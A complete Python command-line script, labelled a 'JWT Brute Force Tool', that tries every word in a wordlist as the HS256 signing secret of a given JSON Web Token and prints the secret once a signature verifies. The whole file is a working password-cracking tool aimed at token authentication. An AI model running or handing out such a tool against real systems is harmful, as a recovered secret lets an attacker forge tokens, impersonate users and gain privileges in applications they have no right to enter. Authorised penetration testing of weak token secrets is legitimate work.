import jwt
import argparse
import sys

def brute_force_jwt(token, wordlist):
    """
    Attempts to brute force a JWT token's signing secret using a wordlist.
    """
    try:
        header, payload, signature = token.split('.')
    except ValueError:
        print("Invalid JWT format.")
        return

    with open(wordlist, 'r') as file:
        for line in file:
            secret = line.strip()
            try:
                jwt.decode(token, secret, algorithms=["HS256"])
                print(f"[+] Secret found: {secret}")
                return secret
            except jwt.InvalidSignatureError:
                pass  # Incorrect secret, continue brute-forcing
            except Exception as e:
                print(f"Error: {e}")
                sys.exit(1)
    
    print("[-] Secret not found in the provided wordlist.")
    return None

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="JWT Brute Force Tool")
    parser.add_argument("-t", "--token", required=True, help="JWT token to crack")
    parser.add_argument("-w", "--wordlist", required=True, help="Path to the wordlist file")
    
    args = parser.parse_args()
    
    print(f"[*] Cracking JWT token: {args.token}")
    result = brute_force_jwt(args.token, args.wordlist)
    if result:
        print(f"[+] JWT successfully cracked. Secret: {result}")
    else:
        print("[-] Failed to crack JWT.")
